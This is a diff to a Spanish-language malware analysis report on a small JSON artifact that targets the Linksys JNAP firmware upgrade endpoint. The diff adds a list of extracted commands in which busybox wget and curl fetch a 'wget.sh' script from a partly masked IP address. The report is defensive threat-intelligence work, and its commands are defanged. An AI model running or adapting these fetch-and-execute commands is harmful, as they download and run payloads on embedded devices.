@@ -4,7 +4,12 @@
 
 ## 📌 Resumen
 
-Artefacto identificado como JSON text data de 289 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Upgrade` en `hxxp://linksys[.]com/jnap/firmware/Upgrade`. Se extrajeron 2 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+Artefacto identificado como JSON text data de 289 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Upgrade` en `hxxp://linksys[.]com/jnap/firmware/Upgrade`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**
+
+1. `sh -s ljnap3`
+2. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-`
+3. `curl hxxp://91.92.40.XXX/wget.sh`
+4. `wget hxxp://91[.]92[.]40` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/c8b676ebe2155b0b1999042cd75557a39d0f3b0e129a521ed5e90438d954c51d.md](../../../../../malware-like/oraculo/downloader/c8b676ebe2155b0b1999042cd75557a39d0f3b0e129a521ed5e90438d954c51d.md)
 
 
 ## 🏷️ Clasificación
